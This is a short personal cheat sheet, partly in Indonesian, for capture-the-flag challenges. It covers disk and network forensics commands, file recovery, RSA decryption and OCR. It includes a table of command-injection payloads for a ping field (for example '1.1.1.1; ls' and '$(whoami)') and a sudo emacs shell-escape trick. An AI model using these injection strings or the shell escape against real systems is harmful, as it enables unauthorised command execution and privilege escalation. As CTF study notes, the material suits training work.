# Cara mount detail
fls -r -o 360448 disk.flag.img | grep -Ei "flag|txt|secret|hidden"
icat -o 360448 disk.flag.img 1234

# Network Forensic (wireshark)
## Filter Wireshark
1. tcp.stream eq 5
2. tcp contains "pico"
## Tshark
tshark -r file.pcap -T fields -e tcp.payload (tcp.seq - ip.src - dns.qry.name - http.host - http.user_agent)

# Ping exploitation

| notasi | syntax |
|--------|--------|
| ; | 1.1.1.1; ls |
|&| 1.1.1.1 & ls|
|&&| 1.1.1.1 && ls|
|``| (masih gacha) 8.8.8.8`ls` |
|$|(masih gacha) 8.8.8.8$(id) OR ping $(whoami)|
| (double pipe) | 1.1.1.1 (double pipe) ls |
| (single pipe) | 1.1.1.1 (single pipe) ls |

# Mempersatukan pecahan-zip
cat part_1 part_2 > archive.zip

# Read file via emacs
sudo /PATH/emacs
alt + x - type "shell"

# Unlock file.enc using RSA.key
wc -c file.enc (256=RSA-2048 & 512=RSA-4096)
openssl pkeyutl -decrypt -inkey key.key -in flag.enc (for 256)

# Copy isi file.txt
cat file.txt | xclip -selection clipboard

# Tools nembuka foto
1. feh file.png
2. shotwell file.png
3. open file.png

# Copy teks di dalam gambar (kadang typo, mending pake G-LENS)
tesseract file.png output

# Checksum256
sha256sum files/* | grep "3ad3"

# Cara mengetahui commit yang udah dihapus (github)
1. git log --all --oneline(ini opsional)
